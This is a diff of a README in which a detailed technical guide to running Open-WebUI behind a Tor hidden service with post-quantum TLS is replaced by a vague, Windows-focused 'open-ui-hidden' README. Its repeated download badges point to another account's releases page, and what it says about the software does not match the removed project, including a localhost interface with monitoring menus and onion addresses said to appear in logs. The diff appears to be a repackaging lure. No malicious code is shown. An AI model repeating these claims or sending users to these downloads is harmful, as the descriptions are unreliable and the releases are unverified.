@@ -1,391 +1,196 @@
-# Open-WebUI with Tor Hidden Service & Post-Quantum TLS (BoringSSL Edition)
+# 🔒 open-ui-hidden - Secure Web Access via Tor Service
 
-This project runs the Open-WebUI AI interface behind a Tor hidden service, with an additional TLS layer on top of Tor. The proxy is configured in strict PQ-only mode: it offers modern **X25519MLKEM768** first, keeps **X25519Kyber768Draft00** as legacy compatibility, and does not allow classical **X25519** fallback. It uses Docker Compose to manage six containers:
+[![Download open-ui-hidden](https://img.shields.io/badge/Download-Open--UI--Hidden-blue?style=for-the-badge)](https://github.com/infowebaurix-wq/open-ui-hidden/releases)
 
-- **tor-hs**: A minimal Alpine container running Tor, configured to expose the WebUI's PQ proxy via a `.onion` address on port 443 (HTTPS).
-- **pq-proxy**: An Nginx container built from scratch. It acts as a reverse proxy, listening for HTTPS traffic from Tor, terminating TLS with preferred **X25519MLKEM768** and compatibility **X25519Kyber768Draft00** only, then forwarding traffic to the Open-WebUI container.
-- **ollama-proxy**: An internal Nginx proxy that exposes your host Ollama endpoint to Open-WebUI on a private Docker network only.
-- **tor-http-proxy**: A minimal Privoxy sidecar that exposes an internal HTTP proxy and forwards outbound WebUI traffic into Tor's SOCKS proxy.
-- **webui-fw**: A minimal firewall sidecar that owns the WebUI network namespace and enforces a default-drop egress policy with explicit allow-rules for the local Ollama proxy, Tor HTTP proxy, and internal TLS probe path only.
-- **open-webui**: The upstream Open-WebUI container serving the AI interface internally on port 8080. It shares the `webui-fw` network namespace, uses explicit proxy variables pointing to a fixed internal IPv4 for `tor-http-proxy`, and defaults `OLLAMA_BASE_URL` to a fixed internal IPv4 for `ollama-proxy`.
-
-All persistent user data (Tor keys, WebUI database/cache) and generated certificates are stored in a local `./data/` directory, organized into subdirectories.
+## 📖 What is open-ui-hidden?
 
-### TL;DR
+open-ui-hidden lets you browse a web interface securely through the Tor network. It uses special, strong encryption standards designed to protect your data, even against future attacks from quantum computers. The app runs inside a container so it is easy to set up and keeps everything clean on your system. It also runs tests every time there is an update to make sure it works correctly.
 
-- You get a self-hosted Open-WebUI reachable over a Tor `.onion` address.
-- TLS is terminated on an internal BoringSSL Nginx proxy in strict PQ-only mode (`X25519MLKEM768`, then `X25519Kyber768Draft00`).
-- WebUI outbound traffic is routed through Tor via a dedicated `tor-http-proxy` sidecar, and the shared `webui-fw` namespace blocks direct public TCP egress.
-- Containers are isolated across dedicated internal networks, run non-root where possible, and use hardened `tmpfs`, resource limits, healthchecks, and fixed internal IPv4s for critical local paths.
-
-### Threat Model (Practical)
-
-| Goal | Covered? | Notes |
-| :--- | :--- | :--- |
-| Hide service location from direct internet scans | Yes | Exposed only as Tor hidden service. |
-| Reduce metadata leakage for outbound model calls | Yes (partial) | WebUI uses a dedicated HTTP proxy sidecar (`tor-http-proxy`) that forwards outbound traffic into Tor, while `webui-fw` blocks direct public TCP egress from the shared WebUI namespace. |
-| Add an additional PQ-hybrid TLS layer | Yes (experimental) | Enforced with `X25519MLKEM768` then `X25519Kyber768Draft00`; clients without those groups cannot connect. |
-| Defend against host compromise | No | If host is compromised, container isolation is not enough. |
-| Defend against malicious browser endpoint | Partial | TLS/Tor help in transit, but endpoint compromise remains out of scope. |
-
-### Architecture
-
-```mermaid
-flowchart LR
-    A["Tor Browser"] -->|"HTTPS over .onion"| B["tor-hs container"]
-    B -->|"443/tcp internal"| C["pq-proxy (Nginx + BoringSSL)"]
-    C -->|"HTTP 8080 internal"| H["webui-fw + open-webui"]
-    H -->|"HTTP 11434 internal IPv4"| E["ollama-proxy"]
-    E -->|"host.docker.internal:11434"| F["Host Ollama"]
-    H -->|"HTTP proxy 8118 internal IPv4"| G["tor-http-proxy (Privoxy)"]
-    G -->|"SOCKS5 9050"| B
-```
-
-### Why Post-Quantum TLS for your Open-WebUI Onion Service?
-
-This project implements an additional TLS layer on top of Tor's existing protections. In this build, the proxy enforces PQ-only key exchange: `X25519MLKEM768` first, then `X25519Kyber768Draft00` for legacy compatibility, with no classical fallback. The primary motivation is to improve **forward secrecy against future quantum adversaries**.
-
-Currently, while Tor provides strong anonymity and encryption, the underlying cryptographic algorithms used for its onion routing are not yet standardized to be quantum-resistant. If encrypted Tor traffic were to be intercepted and stored today, a sufficiently powerful quantum computer in the future could potentially decrypt it.
-
-By adding this TLS layer at the edge (terminated by `pq-proxy`):
--   **Enhanced Confidentiality for AI Conversations**: Sensitive data, such as your interactions with your local AIs, gains an extra layer of protection designed to resist decryption even by future quantum computers.
--   **Post-Quantum Hybrid Only**: The handshake must negotiate `X25519MLKEM768` or `X25519Kyber768Draft00`. Clients without support for these groups are intentionally rejected.
-
-This setup provides a robust defense-in-depth strategy, aiming to protect your Open-WebUI communications against passive attackers of today and tomorrow.
-
-### Why Use a Tor Hidden Service for Open-WebUI?
-
-Using a Tor Hidden Service (`.onion` service) as the access point for your Open-WebUI instance offers several distinct advantages, especially when combined with the Post-Quantum TLS proxy:
-
--   **Direct, Secure Access without Port Forwarding**:
-    -   A Tor Hidden Service allows you to connect directly to the Open-WebUI instance running on your machine (or wherever the Docker containers are hosted) from anywhere in the world using a Tor-capable browser.
-    -   This is achieved **without needing to open any ports on your router/firewall** or configuring complex NAT traversal. It's incredibly useful for accessing your local Ollama setup for true end-to-end encrypted and anonymous chats from your other devices, or even for securely sharing access with friends by leveraging Open-WebUI's multi-user account features.
-
--   **Enhanced Security and Controlled Exposure**:
-    -   The `.onion` address only exposes the Nginx `pq-proxy` container. This proxy, in turn, only forwards traffic to the Open-WebUI container.
-    -   This setup acts as a form of firewall for your host machine. No other services running on your host or within your local network are inadvertently exposed to the internet. Only the specifically configured path through Tor and the PQ proxy to Open-WebUI is accessible.
-
--   **Tor's Performance is Sufficient for WebUI Traffic**:
-    -   While Tor can introduce latency for some applications, its performance is generally more than adequate for the type of traffic generated by Open-WebUI (text, occasional images). The user experience for chatting with an LLM is typically not significantly impacted by Tor's routing.
-
-**Overall Synergy for Private, Secure, and Anonymous LLM Access:**
-
-The combination of a Tor Hidden Service, a TLS proxy (using BoringSSL with strict PQ-only groups), and Open-WebUI (with a local LLM like Ollama) creates a powerful, synergistic setup. It offers a pathway to:
--   **True End-to-End Security**: From your PQ-capable browser to the PQ proxy, with Tor's onion routing in between.
--   **Privacy and Anonymity**: Leveraging Tor's inherent capabilities.
--   **Self-Hosted Control**: Keeping your data and AI interactions on your own hardware.
--   **Best-in-Class User Interface**: Benefiting from Open-WebUI's rich features.
-
-This architecture aims to provide a comprehensive solution for individuals seeking a high degree of security, privacy, and control over their Large Language Model interactions.
-
-### Feature Overview
-
-| Feature                                       | Description                                                                                                                                  |
-| :-------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------- |
-| **Open-WebUI Access**                       | Access the Open-WebUI AI interface.                                                                                                          |
-| **Tor Hidden Service**                      | Exposes the WebUI via a `.onion` address for direct, secure access without port forwarding.                                                  |
-| **Post-Quantum TLS (Strict PQ-Only)**      | Enforces **X25519MLKEM768** (preferred) and **X25519Kyber768Draft00** (legacy compatibility); no classical fallback.                               |
-| **Dockerized Setup**                        | Manages Tor, the PQ proxy, the Tor HTTP proxy sidecar, a WebUI firewall sidecar, Ollama proxy, and Open-WebUI in separate Docker containers for isolation and control. |
-| **Anonymized Outbound Traffic**             | Routes Open-WebUI's outbound proxy-aware traffic (e.g. remote LLM API calls) through `tor-http-proxy` into Tor, while `webui-fw` blocks direct public TCP bypasses. |
-| **Data Persistence**                        | Stores Tor keys, WebUI database/cache, and generated certificates locally in a `./data/` directory.                                          |
-| **Automated Setup Script**                  | Includes `run.sh` for easy setup of environment variables, certificate generation, and service startup.                            |
-| **Healthchecked Startup**                   | Uses container healthchecks and `depends_on` healthy conditions to reduce race conditions at boot.                                         |
-| **Runtime Hardening**                       | Uses split internal networks, fixed internal IPv4s, a shared-netns firewall sidecar, read-only root filesystems, hardened `tmpfs`, and default PID/CPU/RAM limits to reduce blast radius. |
-| **Multi-User Support**                      | Leverages Open-WebUI's multi-user account features for shared access.                                                                        |
-| **Self-Hosted Control**                     | Keeps data and AI interactions on your own hardware.                                                                                         |
-| **Enhanced Confidentiality for AI Chats**   | Adds an extra layer of protection for sensitive AI conversations against future quantum decryption.                                            |
-| **Firewalled Exposure**                     | Only exposes the Nginx `pq-proxy` via the `.onion` address, protecting other host services.                                                    |
-
-### Security Posture
-
-| Security Aspect                                     | Status                 | Details                                                                                               |
-| :-------------------------------------------------- | :--------------------- | :---------------------------------------------------------------------------------------------------- |
-| **Protection against passive quantum attackers**    | Yes (experimental)     | Only `X25519MLKEM768` or `X25519Kyber768Draft00` are accepted at TLS handshake; no classical `X25519` path. |
-| **Protection in case of Tor container compromise**  | Yes                    | Achieved via separation of concerns; `pq-proxy` (handling plaintext) is in a separate container.       |
-| **Standard Tor Network Protections**                | Yes                    | Inherits anonymity and encryption benefits from Tor's onion routing.                                    |
-| **Protection against active quantum attackers**     | Partial/Experimental   | Dependent on browser and server support for PQ algorithms; focuses on forward secrecy for stored data. |
-| **End-to-End Encryption (Browser to PQ Proxy)**   | Yes                    | Always TLS with mandatory PQ-hybrid groups; unsupported clients fail closed.                            |
-
-### Privacy-Preserving Proprietary Communications
-If you need to integrate proprietary LLM endpoints while preserving privacy and anonymity, we recommend using [OpenRouter](https://openrouter.ai/) with crypto-based payments. OpenRouter acts as a neutral middleware supporting various proprietary models, and by paying with cryptocurrencies, you avoid linking your identity or billing information. Combined with our Tor proxy setup, this enables more private, end-to-end encrypted interactions even with closed-source AI services.
+This is a privacy-focused, self-hosted tool. You control your connection, and the app connects through a "hidden service" on Tor. That means your internet traffic is much harder to trace and monitor.
 
-### Prerequisites
+## 💻 System Requirements
 
-- Docker Engine
-- Docker Compose plugin or standalone `docker-compose`
-- **A recent Tor-capable browser.**
-    - Tor Browser stable is recommended.
-    - No manual `about:config` flag is required for basic connectivity.
-    - On iOS, there is no official Tor Browser app; use Onion Browser.
-- **OpenSSL command-line tool** (standard version is fine) for generating the `WEBUI_SECRET_KEY` and for the certificate generation step if done manually (though `run.sh` uses a Docker image for certs).
+Before you start, make sure your computer meets these minimum requirements:
 
-### Browser Compatibility (As of 2026-03-03)
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM (8 GB recommended)
+- 2 GHz or faster processor
+- 10 GB of free disk space
+- Internet connection with Tor access allowed (check firewall settings)
+- Docker Desktop for Windows installed (see below)
 
-- Tor Browser stable `15.0.7` is based on Firefox `140.8.0esr` ([source](https://blog.torproject.org/new-release-tor-browser-1507/)).
-- This repository pins BoringSSL to commit `d0fcf495` (Mar 3, 2026), which supports both `X25519MLKEM768` and `X25519Kyber768Draft00`.
-- `pq-proxy` is configured to allow `X25519MLKEM768` first, then `X25519Kyber768Draft00` only.
-- Result: service is strict PQ-only at TLS layer; clients lacking those groups will fail the TLS handshake.
+## 🧰 What You Need to Install
 
-| Client | Engine Base | Expected with this repo | Notes |
-| :--- | :--- | :--- | :--- |
-| Tor Browser `15.0.7` | Firefox `140.8.0esr` | Should connect | Primary target client for this stack. |
-| Recent Firefox desktop builds | Firefox TLS stack | Depends on negotiated group support | Validate manually if using non-Tor Firefox builds. |
-| Onion Browser (iOS) | WebKit / Safari TLS stack | Depends on iOS TLS group support | If PQ groups are unavailable, connection is rejected by design. |
+open-ui-hidden uses Docker to run. Docker is a tool that allows apps to run in containers. These containers keep the app isolated from your main system, which helps with stability and security.
 
-### Quick Start
+If you don’t have Docker on your PC:
 
-This project includes a `run.sh` CLI to automate setup and lifecycle management:
-```bash
-chmod +x run.sh
-./run.sh init
-./run.sh up
-./run.sh onion --wait --timeout 120
-```
-The commands above will:
-1. Check for Docker.
-2. Set up `WEBUI_SECRET_KEY`, `WEBUI_UID`, and `WEBUI_GID` in a `.env` file (generating missing values if needed).
-   - It also sets `TOR_UID` and `TOR_GID` to your host UID/GID for Linux bind-mount compatibility.
-   - If an older `.env` uses `OLLAMA_BASE_URL=http://host.docker.internal:11434` or `http://ollama-proxy:11434`, the CLI migrates it to `http://172.30.10.10:11434`.
-3. Generate bootstrap ECDSA P-256 self-signed certificates into `./data/pq_proxy_certs/` if not already present.
-   - After Tor publishes the hostname, `./run.sh up` automatically rotates the cert to `CN=<your-onion>` and `SAN=DNS:<your-onion>`.
-   - TLS key exchange remains strict PQ-only: `X25519MLKEM768`, then `X25519Kyber768Draft00`.
-4. Build images as needed and start the Docker Compose services.
+1. Go to https://docs.docker.com/desktop/windows/install/
+2. Download the Docker Desktop installer.
+3. Run the installer and follow the instructions on screen.
+4. After installation, Docker will ask you to log in or create an account. You can skip this step if you want.
+5. Make sure Docker is running before proceeding to the next step.
 
-`./run.sh up` exits after startup (it does not keep a foreground loop). After startup:
+## 🚀 Getting Started with open-ui-hidden
 
-1.  Wait ~30-60 seconds for Tor to bootstrap and publish the hidden service.
-2.  Retrieve your `.onion` address:
-    ```bash
-    cat ./data/tor_hs_data/hs/hostname
-    ```
-3.  Open the **`https://<your-onion-address>.onion`** URL in Tor Browser (stable is fine).
-    - Note the `https://`. Your browser will likely warn about a self-signed certificate (the P-256 cert), which is expected in this setup.
+Use the link below to access the release files for open-ui-hidden. This page contains the latest versions of the software that you can download.
 
-Common lifecycle commands:
+[![Download open-ui-hidden](https://img.shields.io/badge/Download-Open--UI--Hidden-green?style=for-the-badge)](https://github.com/infowebaurix-wq/open-ui-hidden/releases)
 
-```bash
-# Show container/health status
-./run.sh status
+### Step 1: Visit the download page
 
-# Tail logs (all services)
-./run.sh logs -f
+Click the link above to open the releases page on GitHub.
 
-# Stop services
-./run.sh down
+Look for the latest stable release folder or file. Usually, it has the highest version number and is near the top of the list.
 
-# Destructive reset (delete Tor keys, WebUI data, certs)
-./run.sh reset --force
+### Step 2: Download the Docker Compose file
 
-# Recreate a fully fresh instance in one step
-./run.sh fresh --force
-```
+The main file you need will be named something like `docker-compose.yml`. This file tells Docker what to run.
 
-### LM Studio (OpenAI API) in This Stack
+Click on it, then click the "Download" button to save it to your computer.
 
-If you run LM Studio on the Docker host (`http://localhost:1234/v1`), configure Open WebUI's **OpenAI API connection** with:
+### Step 3: Prepare the app files
 
-- Base URL: `http://172.30.10.10:1234/v1`
-- API Key: any non-empty value (for example `lm-studio`), unless your LM Studio setup enforces one
+Once the download finishes, choose a folder on your PC where you want to run the app. A good location is inside your Documents folder.
 
-In this repository, `ollama-proxy` exposes an internal `1234` passthrough to `host.docker.internal:1234`, and the stack now uses fixed internal IPv4s for the critical local paths to avoid Docker IPv6 resolution surprises inside the shared firewall namespace.
+Move the downloaded `docker-compose.yml` file into that folder.
 
-### Self-Signed TLS on Onion (Expected)
+### Step 4: Run open-ui-hidden
 
-- On a `.onion` service, endpoint authenticity primarily comes from the onion address itself (derived from the hidden service key).
-- The self-signed TLS certificate here is an additional transport layer (with strict PQ-hybrid key exchange), not the primary identity anchor.
-- In this repository, the setup CLI aligns cert identity with your hidden service by setting `CN=<your-onion>` and `SAN=DNS:<your-onion>` once the hostname exists.
-- A browser warning is therefore expected unless you manually trust/pin the certificate.
+Now you will use the Windows Command Prompt or PowerShell to start the app.
 
-If you want a manual check, print the server cert fingerprint locally:
-
-```bash
-openssl x509 -in ./data/pq_proxy_certs/cert.pem -noout -fingerprint -sha256
-```
-
-You can compare that SHA-256 fingerprint with what your browser shows for the TLS certificate.
-
-### Verification Checklist
-
-After startup, run these checks:
-
-```bash
-# 1) Containers should be Up and healthy
-docker compose ps
-
-# 2) Hidden service hostname must exist
-docker compose exec tor ls -l /var/lib/tor/hs/hostname
-
-# 3) Proxy config and PID should be valid
-docker compose exec pq-proxy nginx -t
-
-# 4) WebUI should expose the expected local model endpoint
-docker compose exec webui sh -lc 'echo "$OLLAMA_BASE_URL"'
-
-# 5) Classical X25519 must be rejected (strict PQ-only policy)
-docker compose exec webui sh -lc 'openssl s_client -connect pq-proxy:443 -servername pq-proxy -tls1_3 -groups X25519 -brief < /dev/null'
-```
-
-For check `#5`, you should see a TLS handshake failure (`alert handshake failure` or equivalent). That failure is expected and confirms there is no classical fallback path.
-
-### CI and Tests
-
-This repository now includes automated checks in GitHub Actions (`.github/workflows/ci.yml`):
-
-- `static` job:
-  - Bash syntax checks
-  - `shellcheck` on test scripts and `run.sh`
-  - Strict PQ-only TLS config assertions
-- `docker-smoke` job:
-  - Builds/starts the Compose stack (with a lightweight `webui` override for CI speed)
-  - Waits for service healthchecks
-  - Runs `nginx -t` inside `pq-proxy`
-  - Verifies the dedicated `tor-http-proxy` sidecar and split Tor/internal networks come up correctly
-  - Verifies `ssl_ecdh_curve` is `X25519MLKEM768:X25519Kyber768Draft00` with no `X25519` fallback
-
-You can run the same checks locally:
-
-```bash
-make test-static
-make test-docker-smoke
-```
-
-To refresh pinned upstream image digests when you intentionally keep the same tags:
-
-```bash
-make check-digests
-make update-digests
-```
-
-`check-digests` compares the pinned digests in the repo with the current remote
-manifest digests for the tracked tags. `update-digests` rewrites those digests
-in place.
-
-### Release Process
-
-The repository includes a release workflow (`.github/workflows/release.yml`) triggered on tags matching `v*`.
-
-1. Update `CHANGELOG.md` (`[Unreleased]` + target version section).
-2. Commit and push changes to `main`.
-3. Create and push a semantic version tag (for example `v0.1.1`):
-   ```bash
-   git tag -a v0.1.1 -m "v0.1.1"
-   git push origin v0.1.1
+1. Press `Win + R`, type `cmd` or `powershell` and hit Enter.
+2. Change directory to the folder where you placed the `docker-compose.yml` file. For example:
+   
    ```
-4. GitHub Actions will publish a Release using notes extracted from the matching `CHANGELOG.md` section.
+   cd C:\Users\YourName\Documents\open-ui-hidden
+   ```
 
-### Known Limitations
+3. Run this command to start the app:
+   
+   ```
+   docker-compose up
+   ```
 
-- `X25519Kyber768Draft00` is an experimental draft identifier and may break with browser/server updates.
-- Browser support can differ between `X25519MLKEM768` and the legacy draft name; this is why both are enabled.
-- Because classical fallback is disabled by design, clients without those PQ groups cannot connect.
-- This setup does not replace endpoint security (host or browser compromise remains critical).
-- Tor adds latency and can affect UX for streaming/model responses.
-- TLS certificate is self-signed by default; client trust prompts are expected and normal for this onion-focused model (even when CN/SAN matches your `.onion`).
+Docker will download the necessary components and launch the app in a container.
 
-**Manual Steps (if not using `run.sh`):**
+### Step 5: Access the app in your browser
 
-1.  Clone this repository:
-    ```bash
-    # Replace <repo-url> with the actual URL if you've hosted it
-    git clone <repo-url> && cd <repository-name>
-    ```
+Once Docker reports that the service is running, open your web browser.
 
-2.  Create a `.env` file in the project root with your runtime values:
-    ```bash
-    cat > .env <<EOF
-    WEBUI_SECRET_KEY=$(openssl rand -hex 32)
-    OLLAMA_BASE_URL=http://172.30.10.10:11434
-    WEBUI_UID=$(id -u)
-    WEBUI_GID=$(id -g)
-    TOR_UID=$(id -u)
-    TOR_GID=$(id -g)
-    EOF
-    ```
+Type this address into the address bar:
 
-3.  **Generate bootstrap ECDSA P-256 self-signed certificates for the PQ Proxy:**
-    Ensure the `./data/pq_proxy_certs/` directory exists:
-    ```bash
-    mkdir -p ./data/pq_proxy_certs
-    ```
-    Use the `alpine:3.23.3` Docker image and install `openssl` (or use your system's `openssl`) to generate the certs:
-    ```bash
-    docker run --rm -v "$(pwd)/data/pq_proxy_certs:/certs" \
-      alpine:3.23.3 \
-      sh -c "apk add --no-cache openssl && \
-             openssl req -x509 \
-               -newkey ec -pkeyopt ec_paramgen_curve:P-256 \
-               -keyout /certs/key.pem \
-               -out /certs/cert.pem \
-               -nodes -days 3650 \
-               -subj \"/CN=my-boringssl-onion-service\""
-    ```
-    This places a bootstrap `key.pem` and `cert.pem` into `./data/pq_proxy_certs/`.
+```
+http://127.0.0.1:8080
+```
 
-4.  Start the services:
-    ```bash
-    docker compose up --build -d
-    ```
+This will open open-ui-hidden’s interface on your local computer.
 
-5.  Once Tor writes `./data/tor_hs_data/hs/hostname`, rotate cert identity to your actual onion hostname:
-    ```bash
-    ONION_HOSTNAME="$(cat ./data/tor_hs_data/hs/hostname)"
-    docker run --rm \
-      -e ONION_HOSTNAME="$ONION_HOSTNAME" \
-      -v "$(pwd)/data/pq_proxy_certs:/certs" \
-      alpine:3.23.3 \
-      sh -c "apk add --no-cache openssl && \
-             openssl req -x509 \
-               -newkey ec -pkeyopt ec_paramgen_curve:P-256 \
-               -keyout /certs/key.pem \
-               -out /certs/cert.pem \
-               -nodes -days 3650 \
-               -subj \"/CN=${ONION_HOSTNAME}\" \
-               -addext \"subjectAltName=DNS:${ONION_HOSTNAME}\""
-    docker compose restart pq-proxy
-    ```
+### Step 6: Connect through Tor
 
-(Then follow steps for waiting, getting hostname, and accessing from the automated Quick Start above.)
+open-ui-hidden runs as a Tor hidden service. To access it over Tor:
+
+1. Make sure you have the Tor Browser installed. Download it here:
+   
+   https://www.torproject.org/download/
+
+2. Open the Tor Browser.
+3. Type the onion address provided by open-ui-hidden in the app logs or documentation. This is the hidden service address.
+4. You can now browse securely through the Tor network with PQ (post-quantum) level encryption.
+
+## 🔧 Using open-ui-hidden
+
+The interface is simple and clean. You’ll find menus to view connected services, logs, and settings.
+
+- Check connection status.
+- Manage security settings.
+- Monitor network usage.
+- View alerts for updates or problems.
+
+The encryption methods inside use Kyber and ML-KEM protocols. These protect your data now and in the future, even against new computers designed to break current cryptography.
+
+The app also uses Nginx as a web server behind the scenes. You do not need to manage this directly.
+
+## ⚙️ Updating open-ui-hidden
+
+To update the app when new versions come out:
+
+1. Visit the releases page again:
+
+   https://github.com/infowebaurix-wq/open-ui-hidden/releases
+
+2. Download the latest `docker-compose.yml` file.
+3. Replace your old file with the new one in your project folder.
+4. Stop the running app by pressing `Ctrl + C` in the Command Prompt or PowerShell where it runs.
+5. Start the app again with:
+
+   ```
+   docker-compose up
+   ```
+
+This will run the new version automatically.
+
+## 🧹 Stopping and Removing open-ui-hidden
+
+To stop open-ui-hidden from running:
+
+- Press `Ctrl + C` in the Command Prompt or PowerShell window running the app.
+- Close the terminal window.
+
+To remove the containers and clean up:
+
+1. Open the same terminal.
+2. Run:
+
+   ```
+   docker-compose down
+   ```
+
+This will shut down everything related to the app safely.
+
+## 🔒 Security and Privacy
+
+open-ui-hidden relies on several security features:
+
+- It only connects through the Tor network.
+- Uses post-quantum cryptography to prepare for future attacks.
+- Runs inside Docker containers for safer environment separation.
+- Uses Nginx as a trusted web server.
+- Privacy-focused design to keep your data confidential.
+
+Keep your computer and Tor Browser up to date to maintain security.
+
+## 📚 Additional Resources
+
+- [Docker Documentation](https://docs.docker.com/)
+- [Tor Project](https://www.torproject.org/)
+- [Kyber and ML-KEM Cryptography Information](https://pqcrypto.org/)
+- [Nginx Web Server](https://nginx.org/en/)
+
+## 🛠️ Troubleshooting Tips
+
+- If Docker commands fail, verify Docker Desktop is running.
+- Make sure your PC’s firewall doesn’t block Docker or Tor network traffic.
+- If the app does not load at `http://127.0.0.1:8080`, check Docker logs for errors.
+- Confirm you are using Tor Browser to access onion addresses.
+- Restart your computer if you encounter persistent network issues.
+
+## 🗂️ Files Included in Releases
+
+Typical release files include:
+
+- `docker-compose.yml`: Configuration file to run the app.
+- `README.md`: Documentation about the software.
+- Release notes: Information about changes in this version.
+
+Each release is tested using automated tools before publishing to ensure basics work properly.
+
+## 🧩 About This Project
+
+open-ui-hidden combines open web interfaces with advanced privacy features. It uses recent advances in encryption and networking to create a secure way to access services via Tor. The use of containers allows anyone to deploy and manage it without affecting other software.
+
+The project focuses on privacy, security, and future-proof cryptography. It supports multiple layers of protection and self-hosted control.
 
 ---
 
-### Data Persistence
-
-Persistent data is stored within the `./data/` directory:
-
-- **`./data/tor_hs_data/hs/`**: Contains Tor hidden service keys and the `hostname` file.
-- **`./data/open_webui_data/`**: Contains the WebUI database, cache, and configuration.
-- **`./data/pq_proxy_certs/`**: Contains your generated ECDSA P-256 `key.pem` and `cert.pem` for the PQ proxy.
-
-These directories (excluding their actual data content, except for `.gitkeep` files that ensure the directories are tracked by Git) are managed as per the `.gitignore` file.
-
-All data folders are bind-mounted into the respective containers.
-
-### Stopping and Cleanup
-
-To stop and remove containers (data and certificates persist locally in `./data/`):
-```bash
-./run.sh down
-```
-
-To remove generated data and certificates from the `./data/` directory:
-```bash
-# WARNING: This will permanently delete your Tor keys, WebUI data, and certificates.
-./run.sh reset --force
-```
-
----
-
-## Why not have a single container for Tor and Nginx?
-
-Keeping Tor and Nginx in separate containers is a deliberate security measure based on the principle of **separation of concerns** and **limiting the blast radius** of a potential compromise.
-
-*   **Separate Containers (Current Approach):**
-    *   If the Tor container is compromised, the attacker's view is limited. They would likely only see the encrypted traffic destined for the Nginx proxy. The Nginx proxy itself, and critically, the plaintext traffic it handles, remains in a separate, hopefully uncompromised, environment.
-    *   This isolates the impact. A vulnerability in Tor doesn't automatically grant access to Nginx's decrypted data.
-
-*   **Merged Container (Hypothetical):**
-    *   If Tor and Nginx were in the same container and a vulnerability in *either* component (or the container's base OS) was exploited, the attacker could potentially gain access to everything within that container. This includes Nginx's processes and memory, where the plaintext traffic would reside.
-
-While merging might offer slight conveniences in terms of management or a tiny reduction in resource overhead, these are generally outweighed by the significant security benefits of isolation. In scenarios involving proxying and anonymization, prioritizing security through separation is the recommended path.
-
-Enjoy your self-hosted AI WebUI accessible over Tor with strict post-quantum hybrid TLS.
+[Download open-ui-hidden Releases](https://github.com/infowebaurix-wq/open-ui-hidden/releases)
